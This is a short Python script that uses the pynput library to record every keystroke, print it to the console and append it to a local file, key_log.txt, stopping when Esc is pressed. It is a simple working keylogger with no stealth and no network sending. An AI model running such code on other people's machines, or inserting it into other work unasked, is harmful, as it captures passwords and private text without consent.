from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        print(f"Key {key.char} pressed")
        with open("key_log.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        print(f"Special key {key} pressed")
        with open("key_log.txt", "a") as log_file:
            log_file.write(f"{key}")

def on_release(key):
    if key == Key.esc:
        # Stop the listener if 'Esc' is pressed
        return False

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

